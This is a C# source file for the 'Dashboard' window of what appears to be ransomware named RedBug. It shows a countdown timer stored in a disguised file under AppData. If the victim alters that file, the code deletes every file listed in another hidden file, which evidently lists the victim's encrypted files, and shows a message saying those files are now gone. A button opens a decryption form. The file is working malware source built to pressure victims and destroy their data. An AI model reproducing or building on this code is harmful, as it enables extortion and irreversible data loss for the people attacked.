using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection.Emit;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RedBug
{
    public partial class Dashboard : Form
    {
        public static TimeSpan lastTimer = TimeSpan.FromMinutes(60);
        public static DateTime timerStart;
        public Dashboard()
        {

            InitializeComponent();

            timerStart = Time_();
            timer1.Start();


        }

        private DateTime Time_()
        {

            string path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\fgraph.txt"
                ;
            if (!File.Exists(path))
            {
                var f = File.Create(path);
                f.Close();

                File.AppendAllText(path, $"{DateTime.Now}");

            }

            if (File.Exists(path))
            {
                DateTime created = File.GetCreationTime(path);
                DateTime modified = File.GetLastWriteTime(path);

                if ((modified - created).TotalSeconds > 70)
                {
                    Final();
                    MessageBox.Show("You have modified the timer file, now all of your Encrypted files have been deleted.", "INFO");
                    return created;
                }
            }

            return Convert.ToDateTime(File.ReadAllText(path));
        }

        static bool t = true;

        private void timer1_Tick(object sender, EventArgs e)
        {
            int lastcount = Form1.encryption_count;
            TimeSpan elapsed = DateTime.Now - timerStart;
            TimeSpan remaining = lastTimer - elapsed;

            if (remaining <= TimeSpan.Zero)
            {
                label6.Text = "00:00:00";
                timer1.Stop();
                //Final();
                return;
            }
            label6.Text = remaining.ToString(@"hh\:mm\:ss");
        }


        private void Final()
        {
            try
            {
                string path2 = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\sys32s32x32.txt";
                var fpath = File.ReadAllLines(path2);
                foreach (string c in fpath)
                {
                    File.Delete(c);
                }

            }
            catch { }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Decryption d = new Decryption();
            d.Show();
            this.ActiveControl = null;
        }

        private void Dashboard_Load(object sender, EventArgs e)
        {
            string path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\sys32s32x64.txt";



            label4.Invoke(() => { label4.Text = File.ReadAllText(path); });

        }
    }
}
